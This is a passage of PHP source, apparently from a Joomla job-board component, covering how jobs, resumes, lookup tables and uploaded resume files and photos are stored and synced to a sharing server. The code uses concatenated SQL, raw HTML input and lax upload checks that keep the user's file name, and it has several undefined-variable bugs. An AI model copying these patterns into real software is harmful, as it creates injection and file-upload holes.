        $data['startpublishing'] = date('Y-m-d H:i:s', strtotime($data['startpublishing']));
        $data['stoppublishing'] = date('Y-m-d H:i:s', strtotime($data['stoppublishing']));


        $spdate = explode("-", $data['startpublishing']);
        if ($spdate[2])
            $spdate[2] = explode(' ', $spdate[2]);
        $spdate[2] = $spdate[2][0];

        $curtime = explode(":", date('H:i:s'));

        $datetime = mktime($curtime[0], $curtime[1], $curtime[2], $spdate[1], $spdate[2], $spdate[0]);

        $data['startpublishing'] = date('Y-m-d H:i:s', $datetime);

        if (!empty($data['alias']))
            $jobalias = $data['alias'];
        else
            $jobalias = $data['title'];

        $jobalias = strtolower(str_replace(' ', '-', $jobalias));
        $data['alias'] = $jobalias;

        if ($this->_job_editor == 1) {
            $data['description'] = JRequest::getVar('description', '', 'post', 'string', JREQUEST_ALLOWRAW);
            $data['qualifications'] = JRequest::getVar('qualifications', '', 'post', 'string', JREQUEST_ALLOWRAW);
            $data['prefferdskills'] = JRequest::getVar('prefferdskills', '', 'post', 'string', JREQUEST_ALLOWRAW);
            $data['agreement'] = JRequest::getVar('agreement', '', 'post', 'string', JREQUEST_ALLOWRAW);
        }
        if ($data['id'] == '') {
            $data['jobid'] = $this->getJobId();
            $data['created'] = date('Y-m-d H:i:s');
        }
        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return false;
        }
        $check_return = $row->check();

        if ($check_return != 1) {
            $this->setError($this->_db->getErrorMsg());
            return $check_return;
        }

        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return false;
        }
        if ($data['city'])
            $storemulticity = $this->storeMultiCitiesJob($data['city'], $row->id);
        if (isset($storemulticity) AND ($storemulticity == false))
            return false;
        $this->storeUserFieldData($data, $row->id);

        if ($this->_client_auth_key != "") {
            $query = "SELECT job.* FROM `#__js_job_jobs` AS job  
						WHERE job.id = " . $row->id;

            $db->setQuery($query);
            $data_job = $db->loadObject();
            if ($data['id'] != "" AND $data['id'] != 0)
                $data_job->id = $data['id']; // for edit case
            $data_job->job_id = $row->id;
            $data_job->authkey = $this->_client_auth_key;
            $data_job->task = 'storejob';
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_value = $jsjobsharingobject->storeJobSharing($data_job);
            $employer = $this->getEmployerModel();
            $employer->updateJobTemp();
            return $return_value;
        }else {
            return true;
        }
    }

    function storeMultiCitiesJob($city_id, $jobid) { // city id comma seprated 
        $db = & JFactory::getDBO();
        $query = "SELECT cityid FROM #__js_job_jobcities WHERE jobid = " . $jobid;
        $db->setQuery($query);
        $old_cities = $db->loadObjectList();

        $id_array = explode(",", $city_id);
        $row = &$this->getTable('jobcities');
        $error = array();

        foreach ($old_cities AS $oldcityid) {
            $match = false;
            foreach ($id_array AS $cityid) {
                if ($oldcityid->cityid == $cityid) {
                    $match = true;
                    break;
                }
            }
            if ($match == false) {
                $query = "DELETE FROM #__js_job_jobcities WHERE jobid = " . $jobid . " AND cityid=" . $oldcityid->cityid;
                $db->setQuery($query);
                if (!$db->query()) {
                    $err = $this->setError($this->_db->getErrorMsg());
                    $error[] = $err;
                }
            }
        }
        foreach ($id_array AS $cityid) {
            $insert = true;
            foreach ($old_cities AS $oldcityid) {
                if ($oldcityid->cityid == $cityid) {
                    $insert = false;
                    break;
                }
            }
            if ($insert) {
                $row->id = "";
                $row->jobid = $jobid;
                $row->cityid = $cityid;
                if (!$row->store()) {
                    $err = $this->setError($this->_db->getErrorMsg());
                    $error[] = $err;
                }
            }
        }
        if (!empty($error))
            return false;

        return true;
    }

    function storeUserFieldData($data, $refid) {
        if ($refid)
            if (is_numeric($refid) == false)
                return false;
        $row = &$this->getTable('userfielddata');
        for ($i = 1; $i <= $data['userfields_total']; $i++) {
            $fname = "userfields_" . $i;
            $fid = "userfields_" . $i . "_id";
            $dataid = "userdata_" . $i . "_id";

            $fielddata['id'] = $data[$dataid];
            $fielddata['referenceid'] = $refid;
            $fielddata['field'] = $data[$fid];
            $fielddata['data'] = isset($data[$fname]) ? $data[$fname] : 0;

            if (!$row->bind($fielddata)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                echo $this->_db->getErrorMsg();
                return false;
            }
        }
        return true;
    }

    function storeShortListCandidate($uid, $resumeid, $jobid) {
        if (is_numeric($resumeid) == false)
            return false;
        if (is_numeric($jobid) == false)
            return false;
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if ($this->shortListCandidateValidation($uid, $jobid, $resumeid) == false)
            return 3;

        $row = &$this->getTable('shortlistcandidate');
        $row->uid = $uid;
        $row->jobid = $jobid;
        $row->cvid = $resumeid;
        $row->status = 1;
        $row->created = date('Y-m-d H:i:s');

        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return false;
        }
        return true;
    }

    function shortListCandidateValidation($uid, $jobid, $resumeid) {
        if ($uid)
            if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
                return false;
        if (is_numeric($jobid) == false)
            return false;
        if (is_numeric($resumeid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_shortlistcandidates
		WHERE jobid = " . $jobid . " AND cvid = " . $resumeid;
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return true;
        else
            return false;
    }

    function storeResume() {
        $row = & $this->getTable('resume');

        $data = JRequest :: get('post');

        if (!$this->_config)
            $this->getConfig('');
        foreach ($this->_config as $conf) {
            if ($conf->configname == 'date_format')
                $dateformat = $conf->configvalue;
        }

        if ($dateformat == 'm-d-Y') {
            $arr = explode('-', $data['date_start']);
            $data['date_start'] = $arr[0] . '/' . $arr[1] . '/' . $arr[2];
            $arr = explode('-', $data['date_of_birth']);
            $data['date_of_birth'] = $arr[0] . '/' . $arr[1] . '/' . $arr[2];
        } elseif ($dateformat == 'd-m-Y') {
            $arr = explode('-', $data['date_start']);
            $data['date_start'] = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
            $arr = explode('-', $data['date_of_birth']);
            $data['date_of_birth'] = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
        }

        $data['date_start'] = date('Y-m-d H:i:s', strtotime($data['date_start']));
        $data['date_of_birth'] = date('Y-m-d H:i:s', strtotime($data['date_of_birth']));

        $data['resume'] = JRequest::getVar('resume', '', 'post', 'string', JREQUEST_ALLOWRAW);

        if ($_FILES['resumefile']['size'] > 0) {
            $file_name = $_FILES['resumefile']['name']; // file name
            $data['filename'] = $file_name;
            $data['filecontent'] = '';
        } else {
            if ($data['deleteresumefile'] == 1) {
                $data['filename'] = '';
                $data['filecontent'] = '';
            }
        }

        if ($_FILES['photo']['size'] > 0) {
            $file_name = $_FILES['photo']['name']; // file name
            $data['photo'] = $file_name;
        } else {
            if ($data['deleteresumefile'] == 1) {
                $data['photo'] = '';
            }
        }

        if (!empty($data['alias']))
            $resumealias = $data['alias'];
        else
            $resumealias = $data['application_title'];

        $resumealias = strtolower(str_replace(' ', '-', $resumealias));
        $data['alias'] = $resumealias;

        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        $resumereturnvalue = $this->uploadResume($row->id);
        $filemismatch = 0;
        if (empty($resumereturnvalue) OR $resumereturnvalue == 6) {
            $resumedeletedata['id'] = $row->id;
            $resumedeletedata['filename'] = '';
            $row->bind($resumedeletedata);
            $row->store();
            if ($returnvalue == 6)
                $filemismatch = 1;;
        }else {
            $upload_resume_file_real_path = $resumereturnvalue;
        }
        $returnvalue = $this->uploadPhoto($row->id);
        $photomismatch = 0;
        if (empty($returnvalue) OR $returnvalue == 6) {
            $resumedeletedata['id'] = $row->id;
            $resumedeletedata['photo'] = '';
            $row->bind($resumedeletedata);
            $row->store();
            if ($returnvalue == 6)
                $photomismatch = 1;
        }else {
            $upload_pic_real_path = $returnvalue;
        }
        $this->storeUserFieldData($data, $row->id);
        if ($this->_client_auth_key != "") {
            $resume_picture = array();
            $resume_file = array();

            $db = &$this->getDBO();
            $query = "SELECT resume.* FROM `#__js_job_resume` AS resume  
						WHERE resume.id = " . $row->id;

            $db->setQuery($query);
            $data_resume = $db->loadObject();
            if ($resumedata['id'] != "" AND $resumedata['id'] != 0)
                $data_resume->id = $resumedata['id']; // for edit case
            if ($_FILES['photo']['size'] > 0)
                $resume_picture['picfilename'] = $upload_pic_real_path;
            if ($_FILES['resumefile']['size'] > 0)
                $resume_file['resume_file'] = $upload_resume_file_real_path;

            $data_resume->resume_id = $row->id;
            $data_resume->authkey = $this->_client_auth_key;
            $data_resume->task = 'storeresume';
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_value = $jsjobsharingobject->storeResumeSharing($data_resume);
            if ($return_value['isresumestore'] == 0)
                return $return_value;

            $status_resume_pic = "";
            if ($photomismatch != 1) {
                if ($_FILES['photo']['size'] > 0)
                    $return_value_resume_pic = $jsjobsharingobject->storeResumePicSharing($data_resume, $resume_picture);
                if (isset($return_value_resume_pic)) {
                    if ($return_value_resume_pic['isresumestore'] == 0 OR $return_value_resume_pic == false)
                        $status_resume_pic = -1;
                    else
                        $status_resume_pic = 1;
                }
            }

            $status_resume_file = "";
            if ($filemismatch != 1) {
                if ($_FILES['resumefile']['size'] > 0)
                    $return_value_resume_file = $jsjobsharingobject->storeResumeFileSharing($data_resume, $resume_file);
                if (isset($return_value_resume_file)) {
                    if ($return_value_resume_file['isresumestore'] == 0 OR $return_value_resume_file == false)
                        $status_resume_file = -1;
                    else
                        $status_resume_file = 1;
                }
            }
            if (($status_resume_pic == -1 AND $status_resume_file == -1) OR ($filemismatch == 1 AND $photomismatch == 1)) {
                $return_value['message'] = "Resume Save But Error Uploading Resume File and Picture";
            } elseif (($status_resume_pic == -1) OR ($photomismatch == 1)) {
                $return_value['message'] = "Resume Save But Error Uploading Picture";
            } elseif (($status_resume_file == -1) OR ($filemismatch == 1)) {
                $return_value['message'] = "Resume Save But Error Uploading file";
            }
            return $return_value;
        } else {
            if (($filemismatch == 1) OR ($photomismatch == 1))
                return 6;
            return true;
        }
    }

    function uploadResume($id) {
        if (is_numeric($id) == false)
            return false;
        global $resumedata;
        $db = & JFactory::getDBO();
        $str = JPATH_BASE;
        $base = substr($str, 0, strlen($str) - 14); //remove administrator
        $resumequery = "SELECT * FROM `#__js_job_resume` WHERE uid = " . $db->Quote($u_id);
        $iddir = 'resume_' . $id;
        if (!isset($this->_config))
            $this->getConfig();
        foreach ($this->_config as $conf) {
            if ($conf->configname == 'data_directory')
                $datadirectory = $conf->configvalue;
        }
        $path = $base . '/' . $datadirectory;

        if ($_FILES['resumefile']['size'] > 0) {
            $file_name = $_FILES['resumefile']['name']; // file name
            $file_tmp = $_FILES['resumefile']['tmp_name']; // actual location
            $file_size = $_FILES['resumefile']['size']; // file size
            $file_type = $_FILES['resumefile']['type']; // mime type of file determined by php
            $file_error = $_FILES['resumefile']['error']; // any error!. get reason here

            if (!empty($file_tmp)) { // only MS office and text file is accepted.
                $ext = $this->getExtension($file_name);
                if (($ext != "txt") && ($ext != "doc") && ($ext != "docx") && ($ext != "pdf"))
                    return 6; //file type mistmathc

                if (!file_exists($path)) { // creating main directory
                    $this->makeDir($path);
                }
                $path = $path . '/data';
                if (!file_exists($path)) { // creating data directory
                    $this->makeDir($path);
                }
                $path = $path . '/jobseeker';
                if (!file_exists($path)) { // creating jobseeker directory
                    $this->makeDir($path);
                }
                $userpath = $path . '/' . $iddir;
                if (!file_exists($userpath)) { // create user directory
                    $this->makeDir($userpath);
                }
                $userpath = $path . '/' . $iddir . '/resume';
                if (!file_exists($userpath)) { // create user directory
                    $this->makeDir($userpath);
                }
                $files = glob($userpath . '/*.*');
                array_map('unlink', $files);  //delete all file in user directory

                move_uploaded_file($file_tmp, $userpath . '/' . $file_name);
                return $userpath . '/' . $file_name;
                return 1;
            } else {
                if ($resumedata['deleteresumefile'] == 1) {
                    $path = $path . '/data/jobseeker';
                    $userpath = $path . '/' . $iddir . '/resume';
                    $files = glob($userpath . '/*.*');
                    array_map('unlink', $files);
                    $resumedata['filename'] = '';
                    $resumedata['filecontent'] = '';
                } else {
                    
                }
                return 1;
            }
        }
    }

        function uploadPhoto($id) {
            if (is_numeric($id) == false)
                return false;
            global $resumedata;
            $db = & JFactory::getDBO();
            $str = JPATH_BASE;
            $base = substr($str, 0, strlen($str) - 14); //remove administrator
            if (!isset($this->_config))
                $this->getConfig();
            foreach ($this->_config as $conf) {
                if ($conf->configname == 'data_directory')
                    $datadirectory = $conf->configvalue;
            }
            $path = $base . '/' . $datadirectory;

            $resumequery = "SELECT * FROM `#__js_job_resume`
		WHERE uid = " . $db->Quote($u_id);
            $iddir = 'resume_' . $id;
            if ($_FILES['photo']['size'] > 0) {
                $file_name = $_FILES['photo']['name']; // file name
                $file_tmp = $_FILES['photo']['tmp_name']; // actual location
                $file_size = $_FILES['photo']['size']; // file size
                $file_type = $_FILES['photo']['type']; // mime type of file determined by php
                $file_error = $_FILES['photo']['error']; // any error!. get reason here

                if (!empty($file_tmp)) {
                    $ext = $this->getExtension($file_name);
                    if (($ext != "gif") && ($ext != "jpg") && ($ext != "jpeg") && ($ext != "png"))
                        return 6; //file type mistmathc
                }

                if (!file_exists($path)) { // creating main directory
                    $this->makeDir($path);
                }
                $path = $path . '/data';
                if (!file_exists($path)) { // creating data directory
                    $this->makeDir($path);
                }
                $path = $path . '/jobseeker';
                if (!file_exists($path)) { // creating jobseeker directory
                    $this->makeDir($path);
                }
                $userpath = $path . '/' . $iddir;
                if (!file_exists($userpath)) { // create user directory
                    $this->makeDir($userpath);
                }
                $userpath = $path . '/' . $iddir . '/photo';
                if (!file_exists($userpath)) { // create user directory
                    $this->makeDir($userpath);
                }
                $files = glob($userpath . '/*.*');
                array_map('unlink', $files);  //delete all file in user directory

                move_uploaded_file($file_tmp, $userpath . '/' . $file_name);
                return $userpath . '/' . $file_name;
                return 1;
            } else {
                if ($resumedata['deleteresumefile'] == 1) {
                    $path = $path . '/data/jobseeker';
                    $userpath = $path . '/' . $iddir . '/photo';
                    $files = glob($userpath . '/*.*');
                    array_map('unlink', $files);
                    $resumedata['photo'] = '';
                } else {
                    
                }
                return 1;
            }
        }

        function storeCategory() {
            $row = & $this->getTable('category');

            $data = JRequest :: get('post');
            if (!empty($data['alias']))
                $cat_title_alias = $data['alias'];
            else
                $cat_title_alias = $data['cat_title'];

            $cat_title_alias = strtolower(str_replace(' ', '-', $cat_title_alias));
            $cat_title_alias = strtolower(str_replace('/', '-', $cat_title_alias));
            $data['alias'] = $cat_title_alias;

            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->check()) {
                $this->setError($this->_db->getErrorMsg());
                return 2;
            }
            if ($data['id'] == '') { // only for new
                $result = $this->isCategoryExist($data['cat_title']);
                if ($result == true) {
                    return 3;
                }
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }

            $server_category_data = array();
            if ($this->_client_auth_key != "") {
                $server_category_data['id'] = $row->id;
                $server_category_data['cat_title'] = $row->cat_title;
                $server_category_data['alias'] = $row->alias;
                $server_category_data['isactive'] = $row->isactive;
                $server_category_data['serverid'] = $row->serverid;
                $server_category_data['authkey'] = $this->_client_auth_key;
                $table = "categories";
                $jobsharing = new JSJobsModelJobSharing;

                $return_value = $jobsharing->storeDefaultTables($server_category_data, $table);
                return $return_value;
            } else {
                return true;
            }
        }

        function storeSubCategory() {
            $row = & $this->getTable('subcategory');

            $data = JRequest :: get('post');
            if (!empty($data['alias']))
                $s_c_alias = $data['alias'];
            else
                $s_c_alias = $data['title'];

            $s_c_alias = strtolower(str_replace(' ', '-', $s_c_alias));
            $data['alias'] = $s_c_alias;

            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->check()) {
                $this->setError($this->_db->getErrorMsg());
                return 2;
            }
            if ($data['id'] == '') { // only for new
                $result = $this->isSubCategoryExist($data['title']);
                if ($result == true)
                    return 3;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            $server_subcategory_data = array();
            if ($this->_client_auth_key != "") {
                $server_subcategory_data['id'] = $row->id;
                if ($row->categoryid != "" AND $row->categoryid != 0) {
                    $db = & JFactory::getDBO();
                    $query = "SELECT cat.serverid AS servercatid FROM  #__js_job_categories AS cat WHERE cat.id = " . $row->categoryid;
                    $db->setQuery($query);
                    $servercatid = $db->loadResult();
                    if ($servercatid)
                        $server_category_id = $servercatid;
                    else
                        $server_category_id = 0;
                }
                $server_subcategory_data['categoryid'] = $server_category_id;
                $server_subcategory_data['title'] = $row->title;
                $server_subcategory_data['alias'] = $row->alias;
                $server_subcategory_data['status'] = $row->status;
                $server_subcategory_data['serverid'] = $row->serverid;
                $server_subcategory_data['authkey'] = $this->_client_auth_key;

                $table = "subcategories";
                $jobsharing = new JSJobsModelJobSharing;

                $return_value = $jobsharing->storeDefaultTables($server_subcategory_data, $table);
                return $return_value;
            }else {
                return true;
            }
        }

        function categoryChangeStatus($id, $status) {
            if (is_numeric($id) == false)
                return false;
            if (is_numeric($status) == false)
                return false;

            $row = & $this->getTable('category');
            $row->id = $id;
            $row->isactive = $status;
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            return true;
        }

        function subCategoryChangeStatus($id, $status) {
            if (is_numeric($id) == false)
                return false;
            if (is_numeric($status) == false)
                return false;

            $row = & $this->getTable('subcategory');
            $row->id = $id;
            $row->status = $status;
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            return true;
        }

        function messageChangeStatus($id, $status) {
            if (is_numeric($id) == false)
                return false;
            if (is_numeric($status) == false)
                return false;
            $db = &$this->getDBO();

            $row = & $this->getTable('message');
            $row->id = $id;
            $row->status = $status;
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if ($this->_client_auth_key != "") {
                $data_message_approve = array();
                $query = "SELECT serverid FROM #__js_job_messages WHERE id = " . $id;
                $db->setQuery($query);
                $servermessageid = $db->loadResult();
                $data_message_approve['id'] = $servermessageid;
                $data_message_approve['message_id'] = $id;
                $data_message_approve['authkey'] = $this->_client_auth_key;
                $data_message_approve['status'] = $status;
                if ($status == 1)
                    $fortask = "messageapprove";
                elseif ($status == -1)
                    $fortask = "messagereject";
                $server_json_data_array = json_encode($data_message_approve);
                $jsjobsharingobject = new JSJobsModelJobSharing;
                $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
                return json_decode($return_server_value, true);
            }else {
                return true;
            }
        }

        function folderChangeStatus($id, $status) {
            if (is_numeric($id) == false)
                return false;
            if (is_numeric($status) == false)
                return false;
            $db = &$this->getDBO();

            $row = & $this->getTable('folder');
            $row->id = $id;
            $row->status = $status;
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if ($this->_client_auth_key != "") {
                $data_message_approve = array();
                $query = "SELECT serverid FROM #__js_job_folders WHERE id = " . $id;
                $db->setQuery($query);
                $serverfolderid = $db->loadResult();
                $data_folder_approve['id'] = $serverfolderid;
                $data_folder_approve['folder_id'] = $id;
                $data_folder_approve['authkey'] = $this->_client_auth_key;
                $data_folder_approve['status'] = $status;
                if ($status == 1)
                    $fortask = "folderapprove";
                elseif ($status == -1)
                    $fortask = "folderreject";
                $server_json_data_array = json_encode($data_folder_approve);
                $jsjobsharingobject = new JSJobsModelJobSharing;
                $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
                return json_decode($return_server_value, true);
            }else {
                return true;
            }
        }

        function getClientAuthenticationKey() {
            $job_sharing_config = $this->getConfigByFor('jobsharing');
            $client_auth_key = $job_sharing_config['authentication_client_key'];

            return $client_auth_key;
        }

        function storeJobType() {
            $row = & $this->getTable('jobtype');
            $data = JRequest :: get('post');
            $returnvalue = 1;
            if ($data['id'] == '') { // only for new
                $result = $this->isJobTypesExist($data['title']);
                if ($result == true)
                    $returnvalue = 3;
            }
            if ($returnvalue == 1) {

                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }

            $server_jobtype_data = array();
            if ($this->_client_auth_key != "") {
                $server_jobtype_data['id'] = $row->id;
                $server_jobtype_data['title'] = $row->title;
                $server_jobtype_data['isactive'] = $row->isactive;
                $server_jobtype_data['status'] = $row->status;
                $server_jobtype_data['serverid'] = $row->serverid;
                $server_jobtype_data['authkey'] = $this->_client_auth_key;
                $table = "jobtypes";
                $jobsharing = new JSJobsModelJobSharing;

                $return_value = $jobsharing->storeDefaultTables($server_jobtype_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeJobStatus() {
            $row = & $this->getTable('jobstatus');

            $data = JRequest :: get('post');
            $returnvalue = 1;

            if ($data['id'] == '') { // only for new
                $result = $this->isJobStatusExist($data['title']);
                if ($result == true)
                    $returnvalue = 3;
            }
            if ($returnvalue == 1) {

                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            $server_jobstatus_data = array();
            if ($this->_client_auth_key != "") {
                $server_jobstatus_data['id'] = $row->id;
                $server_jobstatus_data['title'] = $row->title;
                $server_jobstatus_data['isactive'] = $row->isactive;
                $server_jobstatus_data['serverid'] = $row->serverid;
                $server_jobstatus_data['authkey'] = $this->_client_auth_key;
                $table = "jobstatus";
                $jobsharing = new JSJobsModelJobSharing;

                $return_value = $jobsharing->storeDefaultTables($server_jobstatus_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeShift() {
            $row = & $this->getTable('shift');

            $data = JRequest :: get('post');
            $returnvalue = 1;

            if ($data['id'] == '') { // only for new
                $result = $this->isJobShiftsExist($data['title']);
                if ($result == true)
                    $returnvalue = 3;
            }
            if ($returnvalue == 1) {

                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            $server_jobshifts_data = array();
            if ($this->_client_auth_key != "") {
                $server_jobshifts_data['id'] = $row->id;
                $server_jobshifts_data['title'] = $row->title;
                $server_jobshifts_data['isactive'] = $row->isactive;
                $server_jobshifts_data['serverid'] = $row->serverid;
                $server_jobshifts_data['status'] = $row->status;
                $server_jobshifts_data['authkey'] = $this->_client_auth_key;
                $table = "shifts";
                $jobsharing = new JSJobsModelJobSharing;

                $return_value = $jobsharing->storeDefaultTables($server_jobshifts_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeHighestEducation() {
            $row = & $this->getTable('highesteducation');
            $returnvalue = 1;
            $data = JRequest :: get('post');
            if ($data['id'] == '') { // only for new
                $result = $this->isHighestEducationExist($data['title']);
                if ($result == true)
                    $returnvalue = 3;
            }
            if ($returnvalue == 1) {

                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            $server_heighesteducation_data = array();
            if ($this->_client_auth_key != "") {
                $server_heighesteducation_data['id'] = $row->id;
                $server_heighesteducation_data['title'] = $row->title;
                $server_heighesteducation_data['isactive'] = $row->isactive;
                $server_heighesteducation_data['serverid'] = $row->serverid;
                $server_heighesteducation_data['authkey'] = $this->_client_auth_key;
                $table = "heighesteducation";
                $jobsharing = new JSJobsModelJobSharing;

                $return_value = $jobsharing->storeDefaultTables($server_heighesteducation_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeAges() {
            $row = & $this->getTable('ages');
            $data = JRequest :: get('post');
            $returnvalue = 1;
            if ($data['id'] == '') { // only for new
                $result = $this->isAgesExist($data['title']);
                if ($result == true)
                    $returnvalue = 3;
            }
            if ($returnvalue == 1) {
                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            $server_ages_data = array();
            if ($this->_client_auth_key != "") {
                $server_ages_data['id'] = $row->id;
                $server_ages_data['title'] = $row->title;
                $server_ages_data['status'] = $row->status;
                $server_ages_data['serverid'] = $row->serverid;
                $server_ages_data['authkey'] = $this->_client_auth_key;
                $table = "ages";
                $jobsharing = new JSJobsModelJobSharing;
                $return_value = $jobsharing->storeDefaultTables($server_ages_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeCareerLevel() {
            $row = & $this->getTable('careerlevel');
            $returnvalue = 1;
            $data = JRequest :: get('post');
            if ($data['id'] == '') { // only for new
                $result = $this->isCareerlevelExist($data['title']);
                if ($result == true)
                    $returnvalue = 3;
            }
            if ($returnvalue == 1) {
                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            $server_careerlevels_data = array();
            if ($this->_client_auth_key != "") {
                $server_careerlevels_data['id'] = $row->id;
                $server_careerlevels_data['title'] = $row->title;
                $server_careerlevels_data['status'] = $row->status;
                $server_careerlevels_data['serverid'] = $row->serverid;
                $server_careerlevels_data['authkey'] = $this->_client_auth_key;
                $table = "careerlevels";
                $jobsharing = new JSJobsModelJobSharing;
                $return_value = $jobsharing->storeDefaultTables($server_careerlevels_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeExperience() {
            $row = & $this->getTable('experience');
            $returnvalue = 1;
            $data = JRequest :: get('post');
            if ($data['id'] == '') { // only for new
                $result = $this->isExperiencesExist($data['title']);
                if ($result == true)
                    $returnvalue = 3;
            }
            if ($returnvalue == 1) {
                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            $server_experiences_data = array();
            if ($this->_client_auth_key != "") {
                $server_experiences_data['id'] = $row->id;
                $server_experiences_data['title'] = $row->title;
                $server_experiences_data['status'] = $row->status;
                $server_experiences_data['serverid'] = $row->serverid;
                $server_experiences_data['authkey'] = $this->_client_auth_key;
                $table = "experiences";
                $jobsharing = new JSJobsModelJobSharing;
                $return_value = $jobsharing->storeDefaultTables($server_experiences_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeCurrency() {
            $row = & $this->getTable('currency');
            $returnvalue = 1;
            $data = JRequest :: get('post');
            if ($data['id'] == '') { // only for new
                $result = $this->isCurrencyExist($data['title']);
                if ($result == true)
                    $returnvalue = 3;
            }
            if ($returnvalue == 1) {
                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            $server_currencies_data = array();
            if ($this->_client_auth_key != "") {
                $server_currencies_data['id'] = $row->id;
                $server_currencies_data['title'] = $row->title;
                $server_currencies_data['symbol'] = $row->symbol;
                $server_currencies_data['status'] = $row->status;
                $server_currencies_data['default'] = $row->default;
                $server_currencies_data['serverid'] = $row->serverid;
                $server_currencies_data['authkey'] = $this->_client_auth_key;
                $table = "currencies";
                $jobsharing = new JSJobsModelJobSharing;
                $return_value = $jobsharing->storeDefaultTables($server_currencies_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeSalaryRange() {
            $row = & $this->getTable('salaryrange');
            $returnvalue = 1;
            $data = JRequest :: get('post');
            if ($data['id'] == '') { // only for new
                $result = $this->isSalaryRangeExist($data['rangestart'], $data['rangeend']);
                if ($result == true) {
                    $returnvalue = 3;
                }
            }
            if ($returnvalue == 1) {
                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->check()) {
                    $this->setError($this->_db->getErrorMsg());
                    $returnvalue = 2;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            $server_salaryrange_data = array();
            if ($this->_client_auth_key != "") {
                $server_salaryrange_data['id'] = $row->id;
                $server_salaryrange_data['rangestart'] = $row->rangestart;
